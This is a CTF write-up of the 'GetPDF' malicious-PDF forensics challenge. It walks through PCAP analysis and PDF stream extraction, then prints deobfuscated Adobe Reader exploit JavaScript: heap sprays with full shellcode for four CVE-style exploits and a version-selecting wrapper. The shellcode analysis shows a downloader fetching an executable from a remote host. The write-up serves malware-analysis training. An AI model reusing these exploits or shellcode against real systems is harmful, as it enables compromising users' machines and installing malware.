---
layout: post
title: "Cyberdefenders - GetPDF"
date: 2022-02-17
excerpt: GetPDF in my opinion it's an interesting challenge that focus primarly on PDF forensic analysis and reverse engineering...
categories:
  - CTF Write-Up
toc: true
---

## Introduction
Hey folks, I'd like to propose this cool challenge offered by [The Honeynet Project](https://twitter.com/ProjectHoneynet), GetPDF in my opinion it's an interesting challenge that focus primarly on PDF forensic analysis and reverse engineering of some custom CVE's implementations in JavaScript.
## PCAP Analysis
First of all, I analyzed the PCAP using `wireshark`, it showed me a bunch of HTTP and DNS requests, PS: it sounds like christmas day 😃, since the challenge involves the analysis of a PDF document, I started analyze the following HTTP request:
![pcap1](/images/CTF_Write-Up/GetPDF/pcap1.jpg)
Following the `TCP stream` I get the following content:
![pcap2](/images/CTF_Write-Up/GetPDF/pcap2.jpg)
## PDF Analysis
Once extracted the PDF document, I tried to get an overview of the PDF content parsing his structure using `pdfid`:
```s
remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdfid.py fcexploit.pdf
PDFiD 0.2.5 fcexploit.pdf
 PDF Header: %PDF-1.3
 obj                   19
 endobj                18
 stream                 5
 endstream              5
 xref                   1
 trailer                1
 startxref              1
 /Page                  2
 /Encrypt               0
 /ObjStm                0
 /JS                    1
 /JavaScript            1
 /AA                    0
 /OpenAction            1
 /AcroForm              1
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          1
 /XFA                   1
 /Colors > 2^24         0
```
We can clearly see that there's some JavaScript code inside that's embedded in the document that's probably will be executed when the document is opened.
To view what objects are involved with js code I used to launch `pdf-parser`:
```s
remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -a fcexploit.pdf
Comment: 10
XREF: 1
Trailer: 1
StartXref: 1
Indirect object: 18
  7: 5, 7, 9, 10, 22, 23, 28
 /Action 1: 4
 /Annot 3: 6, 8, 24
 /Catalog 2: 1, 27
 /EmbeddedFile 1: 11
 /Page 2: 3, 25
 /Pages 2: 2, 26
Search keywords:
 /JS 1: 4
 /JavaScript 1: 4
 /OpenAction 1: 1
 /AcroForm 1: 27
 /EmbeddedFile 1: 11
 /XFA 1: 28
```
Digging deeply I finally found the stream:
```s
remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 4 fcexploit.pdf
obj 4 0
 Type: /Action
 Referencing: 5 0 R
  <<
    /Type /Action
    /S /JavaScript
    /JS 5 0 R
  >>
remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 5 fcexploit.pdf
obj 5 0
 Type: 
 Referencing: 
 Contains stream
  <<
    /Length 395
    /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]
  >>
```
I noticed that the stream was encoded with different filters: `FlateDecode, ASCII85Decode, LZWDecode, RunLengthDecode`; In order to decode and extract it I used `pdfextract`:
```sh
remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdfextract fcexploit.pdf 
/var/lib/gems/2.7.0/gems/origami-2.1.0/lib/origami/string.rb:416: warning: Using the last argument as keyword parameters is deprecated; maybe ** should be added to the call
/var/lib/gems/2.7.0/gems/origami-2.1.0/lib/origami/string.rb:373: warning: The called method `initialize' is defined here
[error] Object shall end with 'endobj' statement
[error] Breaking on: ">>/Parent ..." at offset 0x60c7
[error] Last exception: [Origami::InvalidObjectError] Failed to parse object (no:25,gen:0)
	 -> [Origami::InvalidDictionaryObjectError] Invalid object for field /XObject
Extracted 5 PDF streams to 'fcexploit.dump/streams'.
Extracted 1 scripts to 'fcexploit.dump/scripts'.
Extracted 0 attachments to 'fcexploit.dump/attachments'.
Extracted 0 fonts to 'fcexploit.dump/fonts'.
Extracted 0 images to 'fcexploit.dump/images'.
```
## JS deobfuscation
Using `de4js` on the extracted script gaves the following obfuscated script:
```javascript
var SSS = null;
var SS = "ev";
var titleStr = "";
$5 = "in";
app.doc.syncAnnotScan();
S$ = "ti";
if (app.plugIns.length != 0) {
    var $$ = 0;
    S$ += "tl";
    $5 += "fo";
    ____SSS = app.doc.getAnnots({
        nPage: 0
    });
    S$ += "e";
    titleStr = this.info.title;
}
var payload = "";
if (app.plugIns.length > 3) {
    SS += "a";
    var arr = titleStr.split(/U_155bf62c9aU_7917ab39/);
    for (var $ = 1; $ < arr.length; $++) {
        payload += String.fromCharCode("0x" + arr[$]);
    }
    SS += "l";
}
```
After manually deobfuscated the script results as following:
```javascript
var titleStr = "";
app.doc.syncAnnotScan();
if (app.plugIns.length != 0) {
    annots = app.doc.getAnnots({
        nPage: 0
    });
    titleStr = this.info.title;
}
var payload = "";
if (app.plugIns.length > 3) {
    var arr = titleStr.split(/U_155bf62c9aU_7917ab39/);
    for (var $ = 1; $ < arr.length; $++) {
        payload += String.fromCharCode("0x" + arr[$]);
    }
    app.eval(payload);
    /*
    payload = 
        encodedPayloadPart1 = annots[1].subject;
        encodedPayload = encodedPayloadPart1.replace(/X_17844743X_170987743/g, "%");
        encodedPayloadPart2 = annots[0].subject;
        encodedPayload += encodedPayloadPart2.replace(/89af50d/g, "%");
        encodedPayload = encodedPayload.replace(/\n/, "");
        encodedPayload = encodedPayload.replace(/\r/, "");
        decodedPayload = unescape(encodedPayload);
        app.eval(decodedPayload)
    */
}
```
This isn't simple JavaScript, it makes use of Adobe Acrobat specific JavaScript objects and methods to refer to the currently loaded document (app.doc), to identify any "annotations" within this document (syncAnnotScan), to access the first and second annotations (getAnnots), to assign it to variables, and finally to eval (run) the code within these variables.
To retrieve the encoded payload, I needed to first retrieve the streams involved, for that I used `pdf-parser.py` with `-a` flag to find the annotations objects:
```s
remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -a fcexploit.pdf | grep Annot
 /Annot 3: 6, 8, 24 
```
We can clearly see that the objects involved inside the payload are object 6 and 8, after analyze them we can see that contain just a reference to an object filtered stream, respectively object 7 and 9:
```s
remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 6 fcexploit.pdf
obj 6 0
 Type: /Annot
 Referencing: 7 0 R
  <<
    /Type /Annot
    /Subtype /Text
    /Name /Comment
    /Rect [ 200 250 300 320 ]
    /Subj 7 0 R
  >>
remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 7 fcexploit.pdf
obj 7 0
 Type: 
 Referencing: 
 Contains stream
  <<
    /Length 8714
    /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]
  >>
remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 8 fcexploit.pdf
obj 8 0
 Type: /Annot
 Referencing: 9 0 R
  <<
    /Type /Annot
    /Subtype /Text
    /Name /Comment
    /Rect [100 180 300 210 ]
    /Subj 9 0 R
  >>
remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 9 fcexploit.pdf
obj 9 0
 Type: 
 Referencing: 
 Contains stream
  <<
    /Length 10522
    /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]
  >>
```
Now that I know which streams are contained in the payload I have to assemble the encoded payload:
```s
remnux@remnux:~/Desktop/c31-Malicious-Portable$ cat fcexploit.dump/streams/stream_9.dmp > stream_encoded_payload.dmp
remnux@remnux:~/Desktop/c31-Malicious-Portable$ cat fcexploit.dump/streams/stream_7.dmp >> stream_encoded_payload.dmp
```
Now I fired up my best friend tool (`Cyberchef❤️`) and started decoding the payload using this [recipe](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'X_17844743X_170987743'%7D,'%25',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'89af50d'%7D,'%25',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cn%7C%5C%5Cr'%7D,'%22%22',true,false,true,false)From_Hex('Auto')Generic_Code_Beautify()), after some decoding routines and manually deobfuscation I get the following script:
```javascript
function s(yarsp, len) {
    while (yarsp.length  *  2 < len)  {
        yarsp += yarsp;
    }

    yarsp = yarsp.substring(0, len  /  2);
    return yarsp;
}

function common_exploit() {
    var chunk_size, payload, nopsled;
    chunk_size = 0x8000;
    // calc.exe payload
    payload = unescape("%uabba%ua906%u29f1%ud9c9%ud9c9%u2474%ub1f4%u5d64%uc583%u3104%u0f55%u5503%ue20f%ued5e%uabb9%uc1ea%u2d70%u1953%u3282%u6897%ud01d%u872d%ufd18%ua73a%u02dc%u14cc%u64ba%u66b5%uae41%uf16c%u5623%udb7c%u7bc1%u5e69%u69dd%uf0b0%ucf0c%u1950%udd95%u5ab9%u7b37%u772b%uc55f%u1531%ue18d%u70c8%uc2c5%u4c1c%u7b34%u2f3a%ue82b%u27c9%u848b%ua512%u999d%u2faa%u84c0%u2bee%u768c%u0bc8%u237e%u4cc6%u51c2%u3abc%ufc45%u1118%uffe5%uf48a%udf14%u6c2f%u8742%u0a57%u6fe9%ub5b5%uca94%ua6ab%u84ba%u77d1%u4a2c%u74ac%uabcf%ub25f%ub269%u5e06%u51d5%u90f3%u978f%uec66%u6942%u6a9b%u18a2%u12ff%u42ba%u7be5%ubb37%u9dc6%u5de0%ufe14%uf2f7%uc6fd%u7812%uda44%u7167%u110f%ubb01%uf81a%ud953%ufc21%u22db%u20f7%u46b9%u27e6%ue127%u8e42%udb91%ufe58%ubaeb%u6492%u07fe%uade3%u4998%uf89a%u9803%u5131%u1192%ufcd5%u3ac9%u352d%u71de%u81cb%u4522%u6d21%uecd2%ucb1c%u4e6d%u8df8%u6eeb%ubff8%u653d%ubaf6%u8766%ud10b%u926b%ubf19%u9f4a%u0a30%u8a92%u7727%u96a7%u6347%ud3b4%u824a%uc4ae%uf24c%uf5ff%ud99b%u0ae1%u7b99%u133d%u91ad%u2573%u96a6%u3b74%ub2a1%u3c73%ue92c%u468c%uea25%u5986%u9261%u71b5%u5164%u71b3%u561f%uabf7%u91c2%ua3e6%uab09%ub60f%ua23c%ub92f%ub74b%ua308%u3cdb%ua4dd%u9221%u2732%u8339%u892b%u34a9%ub0da%ua550%u4f47%u568c%uc8fa%uc5fe%u3983%u7a98%u2306%uf60a%uc88f%u9b8d%u6e27%u305d%u1edd%uadfa%ub232%u4265%u2d3a%uff17%u83f5%u87b2%u5b90");
    nopsled = unescape("%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090");
    while (nopsled.length < chunk_size) {
        nopsled += nopsled;
    }
    nopsled_len = chunk_size  -  (payload.length  +  20);
    nopsled = nopsled.substring(0, nopsled_len);
    heap_chunks = new Array();
    for (var i = 0; i < 2500; i++) {
        heap_chunks[i] = nopsled  +  payload;
    }
    util.printd("1.000000000.000000000.1337 : 3.13.37", new Date());
    try {
        media.newPlayer(null);
    } catch(e) {}
    
    util.printd("1.000000000.000000000.1337 : 3.13.37", new Date());
}

function first_exploit() {
    // freecell.exe payload
    var payload = unescape("%uc929%u65b1%ud7db%u74d9%uf424%u83b8%u3830%u5b84%u4331%u0313%u1343%u6883%udacc%u8571%u413d%u6a30%u13f7%ub07d%u5c06%uc249%ube91%u3948%ud6a4%u4246%ud958%uf0e9%ubf3e%ucb93%uf8bc%u520a%u60a7%ubd5e%u804d%ub8b6%ub75a%u5391%uf6b0%ub933%uea10%ubade%u91ba%ud64b%u1fdb%ub411%ub731%u92ab%uf842%u2a7a%ua0b8%uc819%uc7af%u9bee%u7d10%u4e2e%u4201%u8a96%ude7c%ud1cb%u20f0%ue235%uf4e3%u33a8%u6fbe%u8396%u15b9%ub97f%ud56a%u2c92%uf698%ud416%u50c7%u7361%u386d%u1a83%ue308%u7fb1%u7a3f%u20ac%u90a8%u2d99%u544b%u1868%ucced%u8012%u7b51%u7bef%u4d0b%u4095%u10c6%udea5%ue327%u47ed%u9d3e%u28f4%u51cb%ucfd7%u746c%u8c04%u286b%u95cd%u4396%u0b57%u58e2%ue11e%u508a%uab14%uf7cf%uab12%ufb47%u96c3%u9932%ud41d%u3bda%u7d77%uf214%ub242%u636f%u299d%u2962%u7be8%u7fe4%ub283%ub18f%uee39%u7b09%ub7de%ue345%u8c16%u2e59%u59c0%u6fa5%u263f%uda5e%u8219%ua5d1%u54fc%u0474%u75fc%u53b1%u7f0b%u599a%u9409%u48e7%uf318%u71c6%uc930%u6317%u3126%ua923%u2249%ua830%u4247%uad22%u3340%ude7b%u9f86%ue365%u8693%ufdba%u5594%u0f8f%u59bf%u0de8%u74d9%u16ff%ua327%u1cf0%ub333%u021a%uda1c%u2831%u2868%u583f%u1c0a%u720b%u6af0%u8a62%u64fe%u8883%u7ecc%u83ab%u823a%ufd8c%u0ead%u8e59%uc117%u0c8e%u7204%ufeb6%ue3bc%u9a56%u9545%u10c3%u0698%ube7e%ub5ca%u6f07%u2a75%u0a8a%uc717%ub603%u44b8%u59bc%ue62b%uf459%u93d4%u658e%u377a%u14a6%ua20e%ue517%u49c0%u6cd0%u419d");
    var nop = unescape("%u0A0A%u0A0A%u0A0A%u0A0A");
    var heapblock = nop  +  payload;
    var bigblock = unescape("%u0A0A%u0A0A");
    var headersize = 20;
    var spray = headersize  +  heapblock.length;
    while (bigblock.length < spray)  {
        bigblock += bigblock;
    }
    var fillblock = bigblock.substring(0, spray);
    var block = bigblock.substring(0, bigblock.length  -  spray);
    while (block.length  +  spray < 0x40000)  {
        block = block  +  block  +  fillblock;
    }
    var mem_array = new Array();
    for (var i = 0; i < 1400; i++) {
        mem_array[i] = block  +  heapblock;
    }
    var num = 12999999999999999999888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888;
    util.printf("%45000f", num);
}

function second_exploit() {
    // notepad.exe payload
    var shellcode = unescape("%uc931%u64b1%ub6bf%u558b%ud976%ud9cd%u2474%u58f4%ue883%u31fc%u0d78%u7803%ue20d%u6043%u2c45%u44e1%ub6af%u964c%ub72e%ued9a%u55a9%u1a18%u71cc%u2237%u7e30%u91b7%u1856%ue9ae%u2394%u7479%ucdff%u5e6b%ufc95%ue562%u12a2%u77ad%u53d8%u925f%u4178%ue5b2%ufc62%uf826%ub883%u9e2c%u6c59%uf5dd%u5d2a%uc113%uc7c1%ub031%u6cf7%ua2b6%u1838%u2007%u1d29%ua0b1%u0314%uaee1%ufbd8%u96df%ua80b%uc7cd%uca91%ubfab%u7091%uea13%u7a32%u7bb1%u5ba0%ue130%u3b9f%u8d42%ue4ba%u28a0%u4e20%u29d6%u0147%uf2cc%ucff0%uffb9%u2f62%uc948%u2904%ud333%ude69%u2b88%u10f3%u776b%uedee%uef80%u9fcf%u89c2%uc649%uf510%u36e3%u10fb%ud153%u40ef%u4d82%u41f6%ue4ae%u5cb1%uf58a%uaa78%u3472%u750f%u52e6%u712a%u9faf%u5fea%uc24a%u9cf3%u64f2%u0559%u5ecc%u7957%u0607%ue3a9%u828a%u26fc%uc2cc%u7f97%u1577%u2a0a%u9c21%u73c8%ube3e%u4838%uf571%u04de%uca4d%ue02c%u6126%u4c09%ucab8%u16cf%ueb5c%u3af3%uf869%u3ffd%u02b2%u2bfc%u17bf%u3214%u149e%u8f05%u0fff%uec38%u0df4%ue632%u5709%u0f5f%u481a%u6947%u7913%u5680%u864d%ufe94%u9652%uec98%ua8a6%u13b3%ub6c0%u39da%ub1c7%u1421%ub9d8%u6f32%udef2%u091c%uf4e9%ude69%ufd04%ud308%ud722%u1af7%u2f5a%u15f2%u2d5b%u2f31%u3e43%u2c3c%u26a4%ub9d6%u2921%u6d1c%uabe5%u1e0c%u059e%u8fa4%u3f0e%u3e4d%ucbaa%ud183%u5346%u40f5%ub4de%uf46f%uae52%u7901%u53fa%u1e82%uf294%u8d50%u9b01%u28cf%u50e5%ud262%ue195%u661d%u2003%ufeb8%ubcae");
    var mem_array = new Array();
    var cc = 0x0c0c0c0c;
    var addr = 0x400000;
    var sc_len = shellcode.length  *  2;
    var len = addr  -  (sc_len  +  0x38);
    var yarsp = unescape("%u9090%u9090");
    yarsp = s(yarsp, len);
    var count2 = (cc  -  0x400000)  /  addr;
    for (var count = 0; count < count2; count++) {
        mem_array[count] = yarsp  +  shellcode;
    }

    var overflow = unescape("%u0c0c%u0c0c");
    while (overflow.length < 44952) {
        overflow += overflow;
    }

    this.collabStore = Collab.collectEmailInfo({
        subj: "", msg: overflow
    });
}

function third_exploit() {
    if (app.doc.Collab.getIcon)  {
        var arry = new Array();
        // cmd.exe payload
        var payload = unescape("%ud3b8%u7458%ud901%u2bcb%ud9c9%u2474%ub1f4%u5a65%u4231%u0312%u1242%u3983%u96a4%u56f4%u0d45%u9bbd%ud7af%ue7f8%u982e%u1dcf%u7aa8%ucad5%u92cf%uf3c1%u9d2f%u4766%ufb49%u941e%uc494%u8389%uacfe%u6ad8%udd95%u0935%uf3a2%u801c%ub2d9%u488c%u2678%u0b5c%udd62%u01f4%u5b82%u4792%u4b5e%u2d2e%ubc2a%uf9ff%ue4c1%u9b9a%u83f7%ucc69%u3938%u1fb1%u7e29%uc50b%ue214%u8248%udcd8%ub3b7%u890b%ue425%uab91%u5210%u5192%uc8fc%u9932%u9def%ubaa1%u0795%u1c9f%uacee%uc5ba%u4b1c%uaf20%u0832%u3e47%u9129%uacf0%ude04%u1062%ue9e7%u0804%uf391%ubf69%ucc69%u71f0%u1108%uccee%u0d20%ubecf%ub462%ud949%u9971%u15e3%u3c5a%ub053%u5d89%u6c82%u6648%u07ae%u7ad2%u148a%ub09d%u1572%u1aab%u33e6%u5a91%ub8af%u4744%udd4a%u8b98%u47f2%u2af0%ub1cc%u03cf%u2707%ufe1e%ued8a%uca57%u23cd%u030e%u7277%u39bc%ubf21%u6423%udf3e%u5d93%uea71%u2a42%u2b4d%ud7b8%u0626%u7de4%ue9b8%ue771%uc85c%u0a82%u1f69%u2e8c%u1db2%u258c%u34bf%u2085%u359e%u98b7%u2cff%ue0a5%u6cf4%uf3c6%u7409%uf5ca%u6919%u60cd%u9a13%u4e19%ua74d%uf71c%ub952%uea11%ucba6%u0839%ud1c0%u2527%ud2c7%u10a5%ud8d8%u62bd%ufff2%u0b9a%uebe9%udfee%u1c04%ud389%u3622%u1d77%u4e5a%u177d%u4c5b%u21b3%u5f43%u31b9%u39a4%ubd2a%u4a21%u1291%uc8e5%u0389%u229e%ub43a%u5e0e%u24c3%ud4aa%ud71d%u7246%u4a4c%u53de%ufbf6%uc952%u7098%u72fa%u153a%u1594%ub5a8%ub801%u2057%u29e5%uc6f9%ud08e%u738b%u275f%u1e42%u22e7%u411a");
        var len = 0x400000  -  (payload.length  *  2  +  0x38);
        var yarsp = unescape("%u9090%u9090");
        yarsp = s(yarsp, len);
        var boundary = (0x0c0c0c0c  -  0x400000)  /  0x400000;
        for (var i = 0; i < boundary; i++) {
            arry[i] = yarsp  +  payload;
        }

        var str = unescape("%09");
        while (str.length < 0x4000) {
            str += str;
        }

        str = "N."  +  str;
        app.doc.Collab.getIcon(str);
    }
}

function run_exploit_wrapper() {
    var version = app.viewerVersion.toString();
    version = version.replace(/D/g, '');
    var version_array = new Array(version.charAt(0), version.charAt(1), version.charAt(2));
    
    if ((version_array[0] == 8) && (version_array[1] == 0)  || (version_array[1] == 1 &&
    version_array[2] < 3)) { // version == 8.0.[0-1-2] || version == 8.1.[0-1-2]
        first_exploit();
    }

    if ((version_array[0] < 8) || (version_array[0] == 8 && version_array[1] < 2 && version_array[2] < 2)) { // version < 8.x.x || version == 8.[0-1].[0-1]
        second_exploit();
    }

    if ((version_array[0] < 9) || (version_array[0] == 9 && version_array[1] < 1)) { // version < 9.x.x || version == 9.0.x
        third_exploit();
    }
    common_exploit();
}

run_exploit_wrapper();
```
Now we can see that there are a lot of exploits functions that are executed when some PDF reader version match. 
## Shellcode Analysis
*TL;DR: in this post I will show you only the analysis of common_exploit shellcode otherwise the post would be too long and the analysis would be redoundant because I have applied the same methodology.*  
This step requires to convert the payload containing the shellcode to PE using the [shellcode2exe](http://sandsprite.com/sc2exe/shellcode_2_exe.php) utility, interesting fact: this utility works also with unicode escaped sequence, then I debugged the win exe using `x64dbg` setting up a bp to `LoadLibrary`, when hitted I saw that the shellcode tries to load the urlmon library used to interact with some webserver.
![x64dbg1](/images/CTF_Write-Up/GetPDF/x64dbg1.png)
Stepping through the shellcode execution we can notice that the shellcode tries to use the urlmon's function `UrlDownloadToFileA`, according to [MSDN](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)) it downloads a file from `http[:]//blog.honeynet.org.my/forensic_challenge/malware.4.exe` and saves into a file named  `a.exe` inside the `C:\Windows\System32` folder:
![x64dbg2](/images/CTF_Write-Up/GetPDF/x64dbg2.png)
Unluckily the web server respondes with `404`, so we cannot analyze the second stager.